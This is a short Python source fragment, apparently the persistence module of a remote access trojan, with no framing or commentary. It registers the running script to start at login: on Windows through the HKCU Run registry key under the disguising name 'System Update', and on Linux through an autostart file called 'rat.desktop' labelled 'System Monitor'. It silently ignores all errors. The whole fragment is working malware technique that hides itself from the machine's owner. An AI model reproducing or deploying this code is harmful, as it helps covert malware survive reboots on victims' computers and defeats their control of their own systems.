import os
import sys

def add_persistence():
    try:
        if os.name == 'nt':
            import winreg as reg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, "System Update", 0, reg.REG_SZ, f'"{os.path.realpath(sys.argv[0])}"')
            reg.CloseKey(key)
        elif os.name == 'posix':
            home = os.path.expanduser("~")
            autostart = f"{home}/.config/autostart/rat.desktop"
            with open(autostart, 'w') as f:
                f.write(f"""[Desktop Entry]
Type=Application
Name=System Monitor
Exec="{sys.executable} {os.path.realpath(sys.argv[0])}"
Hidden=false
X-GNOME-Autostart-enabled=true""")
    except:
        pass